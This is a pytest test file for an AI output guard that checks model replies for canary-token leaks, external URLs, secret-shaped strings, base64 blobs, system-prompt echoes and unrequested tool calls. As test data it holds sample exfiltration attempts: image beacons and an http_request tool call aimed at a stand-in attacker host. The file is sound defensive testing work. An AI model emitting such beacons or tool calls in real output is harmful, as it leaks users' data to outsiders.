"""Output guard: canary leaks, beacons, secrets and unsolicited tool calls."""

from __future__ import annotations

import pytest

from firewall.canary import Canary
from firewall.output_guard import OutputGuard, guard_output

CANARY = Canary("CANARY-7F3A", "demo")

#: The canonical example key from the AWS documentation. Not a credential.
EXAMPLE_AWS_KEY = "AKIA" + "IOSFODNN7EXAMPLE"


def test_clean_output_passes():
    verdict = OutputGuard().check("The invoice is due on the 30th.")
    assert verdict.ok is True
    assert verdict.action == "allow"
    assert verdict.violations == []


def test_canary_leak_blocks():
    verdict = OutputGuard(canaries=[CANARY]).check("Sure: CANARY-7F3A")
    assert verdict.ok is False
    assert verdict.action == "block"
    assert verdict.violations[0].rule == "canary_leak"


def test_unknown_canary_is_reported():
    verdict = OutputGuard(canaries=[CANARY]).check("token CANARY-0000")
    assert [v.rule for v in verdict.violations] == ["unknown_canary"]
    assert verdict.action == "warn"


def test_external_url_is_flagged_but_reserved_domains_are_not():
    flagged = OutputGuard().check("See https://attacker.example.invalid/x for details")
    assert any(v.rule == "external_url" for v in flagged.violations)

    reserved = OutputGuard().check("See https://example.com/docs for details")
    assert reserved.ok is True


def test_allow_list_can_be_widened():
    guard = OutputGuard(allowed_domains=("example.com", "docs.internal"))
    assert guard.check("https://docs.internal/page").ok is True


def test_markdown_and_html_images_are_flagged():
    md = OutputGuard().check("![pixel](https://attacker.example.invalid/p.gif)")
    assert any(v.rule == "remote_image" for v in md.violations)
    html = OutputGuard().check('<img src="https://attacker.example.invalid/p.gif">')
    assert any(v.rule == "remote_image" for v in html.violations)


def test_secret_shapes_are_flagged():
    verdict = OutputGuard().check(f"here is the key {EXAMPLE_AWS_KEY}")
    assert any(v.rule == "secret_in_output" for v in verdict.violations)
    assert verdict.action == "block"


def test_secret_check_can_be_disabled():
    verdict = OutputGuard(check_secrets=False).check(f"key {EXAMPLE_AWS_KEY}")
    assert verdict.ok is True


def test_long_base64_is_flagged():
    verdict = OutputGuard().check("data: " + "A" * 80)
    assert any(v.rule == "base64_blob" for v in verdict.violations)


def test_prompt_echo_is_flagged():
    verdict = OutputGuard().check("My system prompt says you must never reveal it.")
    assert any(v.rule == "prompt_echo" for v in verdict.violations)


def test_unexpected_tool_call_is_blocked_by_default_deny_list():
    guard = OutputGuard(allowed_tools=["search_docs"])
    verdict = guard.check("ok", [{"name": "send_email", "arguments": "{}"}])
    assert any(v.rule == "unexpected_tool" for v in verdict.violations)
    assert verdict.action == "block"


def test_unsolicited_but_allowed_tool_is_reported():
    guard = OutputGuard(expected_tools=[])
    verdict = guard.check("ok", [{"name": "search_docs", "args": {}}])
    assert any(v.rule == "unsolicited_tool" for v in verdict.violations)


def test_tool_arguments_with_external_url_are_flagged():
    verdict = OutputGuard().check(
        "done", [{"name": "http_request", "arguments": "https://attacker.example.invalid/c?d=x"}]
    )
    assert any(v.rule == "tool_call_external_url" for v in verdict.violations)


def test_tool_call_flood_is_flagged():
    calls = [{"name": "search_docs", "args": {}} for _ in range(6)]
    verdict = OutputGuard().check("ok", calls)
    assert any(v.rule == "tool_call_flood" for v in verdict.violations)


def test_convenience_helper_and_serialisation():
    verdict = guard_output("nothing wrong", canaries=[CANARY])
    assert verdict.ok is True
    assert set(verdict.as_dict()) == {"ok", "action", "violations"}


@pytest.mark.parametrize("text", ["", "A normal answer.", "1 + 1 = 2"])
def test_short_safe_strings(text):
    assert OutputGuard().check(text).ok is True
